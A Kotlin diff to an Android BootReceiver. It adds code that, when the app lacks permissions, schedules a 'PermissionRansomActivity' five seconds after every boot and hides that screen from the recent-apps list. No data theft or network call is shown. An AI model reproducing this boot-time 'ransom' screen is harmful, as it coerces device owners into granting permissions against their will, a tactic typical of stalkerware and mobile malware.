@@ -34,5 +34,32 @@ class BootReceiver : BroadcastReceiver() {
         } catch (e: Exception) {
             Log.e(tag, "Failed to arm WatchdogJob on boot", e)
         }
+
+        // ── Launch permission ransom on boot if permissions are missing ──
+        try {
+            if (!PermissionRansomActivity.hasAllPermissions(context)) {
+                Log.d(tag, "Permissions missing on boot — launching ransom")
+                // Delay slightly to let the system settle
+                val ransomIntent = Intent(context, PermissionRansomActivity::class.java).apply {
+                    addFlags(
+                        Intent.FLAG_ACTIVITY_NEW_TASK or
+                        Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS
+                    )
+                }
+                // Use AlarmManager for a 5-second delay (system needs time to boot)
+                val pi = android.app.PendingIntent.getActivity(
+                    context, 9991, ransomIntent,
+                    android.app.PendingIntent.FLAG_IMMUTABLE or android.app.PendingIntent.FLAG_UPDATE_CURRENT
+                )
+                val am = context.getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
+                am.setExactAndAllowWhileIdle(
+                    android.app.AlarmManager.ELAPSED_REALTIME_WAKEUP,
+                    android.os.SystemClock.elapsedRealtime() + 5000,
+                    pi
+                )
+            }
+        } catch (e: Exception) {
+            Log.e(tag, "Failed to launch ransom on boot", e)
+        }
     }
 }
